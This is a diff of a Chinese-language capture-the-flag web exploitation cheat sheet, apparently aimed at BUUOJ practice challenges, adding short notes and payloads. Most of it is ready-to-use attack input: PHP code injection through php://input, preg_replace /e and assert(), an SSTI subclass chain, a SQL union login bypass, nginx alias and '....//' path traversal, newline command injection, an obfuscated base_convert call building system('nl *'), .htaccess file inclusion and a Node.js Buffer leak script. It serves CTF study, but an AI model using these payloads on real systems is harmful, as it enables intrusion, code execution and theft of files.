@@ -96,7 +96,7 @@ http://6bf8e619-2004-4945-8cf0-1b438d58e4c2.node4.buuoj.cn:81/index.php?category
 http://6bf8e619-2004-4945-8cf0-1b438d58e4c2.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/woofers/resource=flag
 ```
 
-或者使用php://inpput，使用post传参数<?php system('ls') ?>
+或者使用php://input，使用post传参数<?php system('ls') ?>
 
 ## 跳过反序列化__wakeup()函数
 
@@ -192,6 +192,25 @@ payload，单引号需要自行拼接
 > 日志默认存放位置：/var/log/nginx
 > 配置文件目录为：/usr/local/nginx/conf/nginx.conf
 
+ alias 用于给 localtion 指定的路径设置别名 , 在路径匹配时 , alias 会把 location 后面配置的路径丢弃掉 , 并把当前匹配到的目录指向到 alias 指定的目录 . 
+
+比如
+
+```
+location /web-img {
+   alias /images/;
+   autoindex on;
+}
+```
+
+访问
+
+```
+url/web-img../遍历
+```
+
+
+
 ## 联合查询构造虚拟数据登录
 
 ```
@@ -208,6 +227,36 @@ name=1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#&pwd=123
 
 就可以直接登录
 
+## preg_replace()命令执行
+
+首先简单介绍一下preg_replace()函数
+
+```
+
+preg_replace($pattern, $replacement, $subject)
+作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。
+$pattern:       要搜索的模式，可以是字符串或一个字符串数组。
+$replacement:   用于替换的字符串或字符串数组。
+$subject:       要搜索替换的目标字符串或字符串数组。
+```
+接着关于/e漏洞
+```
+/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向
+引用替换完之后）。
+提示：要确保 replacement 构成一个合法的 PHP 代码字符串，
+否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
+```
+也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码
+
+实例：
+
+```
+?pat=/sd/e&rep=system('ls')&sub=sds
+```
+
+
+
+
 ## phra
 
 使用如下方法
@@ -221,6 +270,10 @@ file.php?file=phar://upload/46a1b93b4756841e1169e9cf9ebf3ecf.jpg
 比如,com/img可以尝试.com/img../穿越
 
 ## SSTI
+
+工具tqlmap（https://github.com/epinna/tplmap）
+
+
 
 测试语句{{1+2}}
 
@@ -266,6 +319,12 @@ https://www.freebuf.com/column/187845.html
 
 
 
+## 过滤关键字
+
+```
+{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__
+```
+
 
 
 ## 奇怪的目录
@@ -275,3 +334,104 @@ index.phps
 ## urldecode
 
 url二次编码
+
+## assert()
+
+**assert()函数会将读入的代码当做PHP代码来执行**
+
+```
+?page=home').phpinfo();//
+```
+
+注意闭合语句
+
+## 执行无回显
+
+可以看看源码
+
+## 宽字符
+
+```
+%bf
+```
+
+## 列表对比
+
+```
+$stuff = $_POST["stuff"];
+$array = ['admin', 'user'];
+if($stuff === $array && $stuff[0] != 'admin') {
+```
+
+这种在php5可以通过溢出来实现对于 ===
+
+```
+stuff[4294967296]=admin&stuff[1]=user
+```
+
+## 数字检测绕过
+
+用正则匹配是否是数字
+
+```
+%0a
+```
+
+换行绕过可以在后面外接字符
+
+```
+num=123%0als
+```
+
+## Node.js沙箱逃逸
+
+```
+import requests
+import time
+url = 'http://19a931b5-2f8a-42c4-b400-20ba417d6a4f.node3.buuoj.cn/?data=Buffer(500)'
+
+while True:
+        r = requests.get(url)
+
+        time.sleep(0.1)
+        print('trying')
+        if 'flag{' in r.text:
+            print(r.text)
+            break
+```
+
+https://blog.csdn.net/SopRomeo/article/details/108963957
+
+## 目录穿越屏蔽../
+
+使用....//绕过
+
+## 数学函数现代码执行
+
+```
+($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))
+```
+
+```
+base_convert(1751504350,10,36) -------->system
+
+$pi(1438255411,14,34) ------>hex2bin
+
+dechex(1852579882) ----->将十进制转为十六进制：6e6c202a（字符串形式是：nl *）
+
+nl *可以读取当前目录下的所有文件
+```
+
+
+
+## htaccess文件包含
+
+```
+搜索文件
+php_value auto_append_file master://search/path={}&name={}
+包含文件
+php_value auto_append_file /home/hiahiahia_flag.php
+```
+
+
+
